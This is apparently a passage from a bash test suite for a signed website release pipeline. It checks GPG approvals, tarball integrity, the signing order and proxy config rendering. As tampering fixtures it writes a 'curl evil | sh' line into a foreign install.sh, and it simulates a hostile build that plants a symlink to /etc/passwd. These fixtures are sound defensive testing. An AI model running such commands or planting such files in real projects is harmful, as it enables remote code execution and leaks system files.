approval "$t/j.txt" "$tree" "$tarh" run-0001 "$exp"; gpg --batch --yes --local-user "$sub2!" --armor --detach-sign --output "$t/j.txt.asc" "$t/j.txt" 2>/dev/null
printf '%s\n' "$appr2" > "$t/allow-primary"; printf '%s\n' "$sub2" > "$t/allow-sub"; printf '%s\n' "$appr2" > "$t/allow-sub-other"
red "approval: signed by a subkey while only the primary key is listed is red" check "$t/j.txt" "$t/appr2.ring" "$t/allow-primary"
grn "approval: signed by the listed subkey passes" check "$t/j.txt" "$t/appr2.ring" "$t/allow-sub"
approval "$t/k.txt" "$tree" "$tarh" run-0001 "$exp"; gpg --batch --yes --local-user "$appr2!" --armor --detach-sign --output "$t/k.txt.asc" "$t/k.txt" 2>/dev/null
red "approval: signed by the primary key while only the subkey is listed is red" check "$t/k.txt" "$t/appr2.ring" "$t/allow-sub"
# in CI the run id is the earlier build run: format enforced, and not the signing run itself
approval "$t/l.txt" "$tree" "$tarh" 77-1 "$exp"; signit "$appr" "$t/l.txt"
grn "approval in CI: run id of an earlier run (<id>-<attempt>) passes" env GITHUB_ACTIONS=true GITHUB_RUN_ID=88 GITHUB_RUN_ATTEMPT=1 "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/l.txt" "$t/l.txt.asc" "$t/appr.ring" "$t/allowed" 77-1
red "approval in CI: the run id of the signing run itself is red" env GITHUB_ACTIONS=true GITHUB_RUN_ID=77 GITHUB_RUN_ATTEMPT=1 "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/l.txt" "$t/l.txt.asc" "$t/appr.ring" "$t/allowed" 77-1
red "approval in CI: a free-text run id is red" env GITHUB_ACTIONS=true GITHUB_RUN_ID=88 GITHUB_RUN_ATTEMPT=1 "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001
# the dist folder (B1) and the tarball (B2)
cp -r "$t/dist" "$t/dist-x"; echo 'curl evil | sh' > "$t/dist-x/install.sh"; red "approval: a foreign file in dist is red (it would be signed)" check "$t/a.txt" "" "" "" "" "$t/dist-x"
cp -r "$t/dist" "$t/dist-y"; rm "$t/dist-y/helfa.org-0.0.1.spdx.json"; red "approval: a missing file in dist is red" check "$t/a.txt" "" "" "" "" "$t/dist-y"
cp -r "$t/dist" "$t/dist-z"; mkdir "$t/dist-z/sub"; red "approval: a folder in dist is red" check "$t/a.txt" "" "" "" "" "$t/dist-z"
cp -r "$t/dist" "$t/dist-t"; echo tamper >> "$t/dist-t/helfa.org-0.0.1-site.tar.gz"; red "approval: tarball changed after the build is red" check "$t/a.txt" "" "" "" "" "$t/dist-t"
cp -r "$t/dist" "$t/dist-m"; sed -i 's/"tree_sha256": "[0-9a-f]*"/"tree_sha256": "'"$zero"'"/' "$t/dist-m/helfa.org-0.0.1-manifest.json"
(cd "$t/dist-m" && sha256sum helfa.org-0.0.1-site.tar.gz helfa.org-0.0.1-manifest.json helfa.org-0.0.1.spdx.json > SHA256SUMS.txt)
red "approval: manifest lying about the hash is red" check "$t/a.txt" "" "" "" "" "$t/dist-m"
cp -r "$t/dist" "$t/dist-mm"; sed -i 's/"mtime": 1700000000/"mtime": 1700000001/' "$t/dist-mm/helfa.org-0.0.1-manifest.json"
(cd "$t/dist-mm" && sha256sum helfa.org-0.0.1-site.tar.gz helfa.org-0.0.1-manifest.json helfa.org-0.0.1.spdx.json > SHA256SUMS.txt)
red "approval: manifest lying about the release time is red" check "$t/a.txt" "" "" "" "" "$t/dist-mm"
# repack helper: a new tarball in a copy of dist, sums and manifest rewritten to match (what a hostile build job would do)
repack() { # distcopy kind: unpack, add something, pack again like site-bauen does not (plain tar), fix sums and manifest
  local d=$1 kind=$2 w="$t/rp-$2"; rm -rf "$w"; mkdir -p "$w"; tar -xzf "$d/helfa.org-0.0.1-site.tar.gz" -C "$w"
  case $kind in
    symlink) mkdir -p "$w/de"; ln -s /etc/passwd "$w/de/leak.html"; chmod 777 "$w/de" ;;
    emptydir) mkdir "$w/empty" ;;
    exec) chmod 755 "$w/index.html" ;;
  esac
  (cd "$w" && tar --sort=name --mtime=@"$SITE_MTIME" --owner=0 --group=0 --numeric-owner --format=gnu -cf - .) | gzip -n -9 > "$d/helfa.org-0.0.1-site.tar.gz"
  new=$(sha256sum "$d/helfa.org-0.0.1-site.tar.gz" | cut -d' ' -f1)
  sed -i 's/"tar_sha256": "[0-9a-f]*"/"tar_sha256": "'"$new"'"/' "$d/helfa.org-0.0.1-manifest.json"
  (cd "$d" && sha256sum helfa.org-0.0.1-site.tar.gz helfa.org-0.0.1-manifest.json helfa.org-0.0.1.spdx.json > SHA256SUMS.txt)
  echo "$new"
}
cp -r "$t/dist" "$t/dist-l"; ntar=$(repack "$t/dist-l" symlink)
red "approval: the old approval does not cover a repacked tarball with a symlink and a 0777 folder" check "$t/a.txt" "" "" "" "" "$t/dist-l"
approval "$t/m.txt" "$tree" "$ntar" run-0001 "$exp"; signit "$appr" "$t/m.txt"
red "approval: even an approval of those exact bytes is red (symlink, 0777 folder: allowlist)" check "$t/m.txt" "" "" "" "" "$t/dist-l"
cp -r "$t/dist" "$t/dist-e"; repack "$t/dist-e" emptydir >/dev/null
red "approval: same files plus an empty folder (same tree hash, other bytes) is red: the bytes are bound" check "$t/a.txt" "" "" "" "" "$t/dist-e"
cp -r "$t/dist" "$t/dist-p"; repack "$t/dist-p" exec >/dev/null
red "approval: same files with an execute bit (same tree hash, other bytes) is red: the bytes are bound" check "$t/a.txt" "" "" "" "" "$t/dist-p"

# --- signing: order key last, rebuild from the approved source, nothing foreign
rm -rf "$t/d1"; cp -r "$t/dist" "$t/d1"
S="$here/site-signieren.sh"
sign() { # dist [approval] [src] [run]
  GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc") "$S" "$1" "${2:-$t/a.txt}" "${2:-$t/a.txt}.asc" "$t/appr.ring" "$t/allowed" "${4:-run-0001}" "$t/rel.pub.asc" "${3:-$t/src}"; }
red "sign: without the key is red (not 'not signed, exit 0')" env -u GPG_PRIVATE_KEY "$S" "$t/d1" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc" "$t/src"
red "sign: with a bad approval signs nothing" sign "$t/d1" "$t/e.txt"
[ -z "$(find "$t/d1" -name '*.asc' -print -quit)" ] && ok "sign: a bad approval left no .asc" || bad "sign: a bad approval left no .asc"
rm -rf "$t/d3"; cp -r "$t/dist" "$t/d3"; echo 'curl evil | sh' > "$t/d3/install.sh"
red "sign: a foreign file in dist is red" sign "$t/d3"
[ ! -e "$t/d3/install.sh.asc" ] && [ -z "$(find "$t/d3" -name '*.asc' -print -quit)" ] && ok "sign: the foreign file got no release signature" || bad "sign: the foreign file got a signature"
rm -rf "$t/srcx"; cp -r "$t/src" "$t/srcx"; echo '<p>other</p>' >> "$t/srcx/index.html"
rm -rf "$t/d4"; cp -r "$t/dist" "$t/d4"
red "sign: a rebuild from another source than the approved one is red" sign "$t/d4" "$t/a.txt" "$t/srcx"
[ -z "$(find "$t/d4" -name '*.asc' -print -quit)" ] && ok "sign: the rebuild comparison came before the key (no .asc)" || bad "sign: .asc after a failed rebuild comparison"
grn "sign: good approval and the approved source sign" sign "$t/d1"
grn "sign: every file has a signature (signatures-check)" "$here/site-signaturen-pruefen.sh" "$t/d1" "$t/rel.pub.asc" helfa.org-0.0.1
cp -r "$t/d1" "$t/d5"; echo x > "$t/d5/install.sh"; red "signatures-check: a foreign file next to the signed ones is red" "$here/site-signaturen-pruefen.sh" "$t/d5" "$t/rel.pub.asc" helfa.org-0.0.1
cp -r "$t/d1" "$t/d6"; rm "$t/d6/SHA256SUMS.txt.asc"; red "signatures-check: a missing .asc is red" "$here/site-signaturen-pruefen.sh" "$t/d6" "$t/rel.pub.asc" helfa.org-0.0.1
cp -r "$t/d1" "$t/d7"; echo x >> "$t/d7/helfa.org-0.0.1.spdx.json"; red "signatures-check: a changed file is red" "$here/site-signaturen-pruefen.sh" "$t/d7" "$t/rel.pub.asc" helfa.org-0.0.1
red "signatures-check: wrong public key is red" "$here/site-signaturen-pruefen.sh" "$t/d1" "$t/other.pub" helfa.org-0.0.1
rm -rf "$t/d2"; cp -r "$t/dist" "$t/d2"
red "sign: wrong public key for the check is red" env "GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc")" "$S" "$t/d2" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/other.pub" "$t/src"

# --- templates
T="$root/templates/site"
[ ! -e "$T/sites" ] && [ ! -e "$T/port80" ] && [ ! -e "$T/gen-pages.sh" ] && ok "templates: no placeholder pages are kept in git" || bad "templates: placeholder pages are back"
export ACME_EMAIL=admin@example.org
R="$T/render.sh"
mktoml "$t/s1.toml" one.example.org static www.one.example.org; mktoml "$t/s2.toml" two.example.org static; mktoml "$t/s3.toml" three.example.org passthrough
SITES=(--allow-passthrough --site "$t/s1.toml" --site "$t/s2.toml" --site "$t/s3.toml")
grn "render: staging is the default" bash -c "'$R' '${SITES[*]}' '$t/s.kdl' >/dev/null 2>&1 || '$R' ${SITES[*]} '$t/s.kdl' >/dev/null 2>&1; grep -q 'staging #true' '$t/s.kdl' && ! grep -q '@[A-Z0-9_]*@' '$t/s.kdl'"
grn "render: production" bash -c "'$R' --production ${SITES[*]} '$t/p.kdl' >/dev/null 2>&1 && grep -q 'staging #false' '$t/p.kdl'"
grn "render: names come from the site.toml files: aliases get a route and are in the certificate" bash -c "grep -q 'host \"www.one.example.org\"' '$t/s.kdl' && grep -q 'domains \"one.example.org\" \"www.one.example.org\"' '$t/s.kdl' && [ \$(grep -c 'acme {' '$t/s.kdl') = 3 ]"
hostfiles=$(cd "$root" && ls scripts/site* templates/site/* .github/workflows/site.yml | grep -v -E '^(scripts/test-site\.sh|templates/site/README\.md)$')
[ "$(wc -l <<<"$hostfiles")" -ge 15 ] && grep -q 'site-signaturen-pruefen.sh' <<<"$hostfiles" && grep -q 'site-tar-pruefen.py' <<<"$hostfiles" && ok "host-name grep covers every scripts/site*, templates/site/* (README aside) and site.yml" || bad "host-name grep file list"
grn "templates and scripts name no host of the three real domains (fixtures only)" bash -c "cd '$root' && ! grep -n -E 'freesynergy\.net|helfa\.org|freeplanetearth\.org' $(tr '\n' ' ' <<<"$hostfiles")"
for f in scripts/site-signaturen-pruefen.sh scripts/site-tar-pruefen.py; do
  rm -rf "$t/hm"; mkdir -p "$t/hm/scripts"; (cd "$root" && cp -r --parents $hostfiles "$t/hm/"); echo '# helfa.org' >> "$t/hm/$f"
  red "mutation: a real host name in $f is found by the grep" bash -c "cd '$t/hm' && ! grep -n -E 'freesynergy\.net|helfa\.org|freeplanetearth\.org' $(tr '\n' ' ' <<<"$hostfiles")"
done
grn "render: port 80 is a real 301 redirect (namespace + redirect filter), no page served" bash -c "grep -q 'type \"redirect\"' '$t/s.kdl' && grep -q 'status-code 301' '$t/s.kdl' && grep -q 'namespace \"redirect\"' '$t/s.kdl' && ! grep -q '_port80' '$t/s.kdl'"
grn "render: roots end in /current of the primary name (what the delivery step swaps)" bash -c "grep -q 'root \"/srv/www/one.example.org/current\"' '$t/s.kdl' && ! grep -q 'root \"/srv/www/www' '$t/s.kdl'"
grn "render: CSP strict by default, passthrough only for the site that says so (and warns)" bash -c "'$R' ${SITES[*]} '$t/c.kdl' 2>'$t/w' >/dev/null; [ \$(grep -c \"script-src 'self'\" '$t/c.kdl') = 1 ] && [ \$(grep -c \"default-src 'none'\" '$t/c.kdl') = 3 ] && grep -q WARNING '$t/w'"
grn "render: csp.policy of site.toml replaces the preset" bash -c "printf 'schema = 1\npurpose = \"website\"\n[names]\nprimary = \"four.example.org\"\n[acme]\nmethod = \"http-01\"\n[csp]\npolicy = \"default-src self; img-src https://cdn.example.org\"\n' > '$t/s4.toml' && '$R' --site '$t/s4.toml' '$t/c4.kdl' >/dev/null && grep -q 'img-src https://cdn.example.org' '$t/c4.kdl'"
red "render: a passthrough site without --allow-passthrough is refused (CSP is not delivered in 26.11_2)" "$R" --site "$t/s1.toml" --site "$t/s3.toml" "$t/x.kdl"
red "render: the same refusal holds for --http-only and --production" bash -c "'$R' --http-only --site '$t/s3.toml' '$t/x.kdl' || '$R' --production --site '$t/s3.toml' '$t/x.kdl'"
grn "render: a static site needs no flag and its note says the CSP header is not delivered" bash -c "'$R' --site '$t/s1.toml' '$t/x1.kdl' 2>'$t/w1' >/dev/null && grep -q 'NOT delivered' '$t/w1'"
red "render: the same name in two sites is refused" "$R" --site "$t/s1.toml" --site "$t/s1.toml" "$t/x.kdl"
red "render: no --site is refused" "$R" "$t/x.kdl"
red "render: a bad site.toml is refused" "$R" --site "$t/f-dns01/site.toml" "$t/x.kdl"
grn "render: writes <file>.sha256 that checks, and renders the same bytes twice" bash -c "'$R' ${SITES[*]} '$t/r1.kdl' >/dev/null 2>&1 && '$R' ${SITES[*]} '$t/r2.kdl' >/dev/null 2>&1 && (cd '$t' && sha256sum --check --quiet r1.kdl.sha256) && cmp '$t/r1.kdl' '$t/r2.kdl'"
grn "render: --http-only (first start) has no ACME and no TLS" bash -c "'$R' --http-only ${SITES[*]} '$t/h.kdl' >/dev/null 2>&1 && ! grep -q 'acme' '$t/h.kdl' && ! grep -q 'protocol \"https\"' '$t/h.kdl' && grep -q '/current\"' '$t/h.kdl'"
red "render: --install-pages is gone (no unchecked copy from git)" "$R" --install-pages --site "$t/s1.toml" "$t/x.kdl"
red "render: path in WEBROOT refused" env WEBROOT='/srv/../etc' "$R" --site "$t/s1.toml" "$t/x.kdl"
red "render: ACME needs an e-mail address" env -u ACME_EMAIL "$R" --site "$t/s1.toml" "$t/x.kdl"
if [ -n "${ZENTINEL_BIN:-}" ]; then for f in s p h; do grn "zentinel test -c on the rendering $f" "$ZENTINEL_BIN" test -c "$t/$f.kdl"; done; fi
exit "$fail"
